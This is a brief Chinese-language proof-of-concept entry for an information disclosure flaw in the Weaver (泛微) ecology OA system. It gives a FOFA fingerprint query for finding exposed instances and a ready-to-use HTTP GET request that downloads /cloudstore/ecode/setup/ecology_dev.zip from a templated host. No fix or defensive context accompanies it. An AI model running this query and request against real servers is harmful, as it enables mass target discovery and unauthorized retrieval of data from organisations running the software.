# 泛微ecology系统setup接口存在信息泄露漏洞



## fofa

```yaml
app="泛微-协同办公OA"
```

## poc

```yaml
GET /cloudstore/ecode/setup/ecology_dev.zip HTTP/1.1 
Host: {{Hostname}} 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```

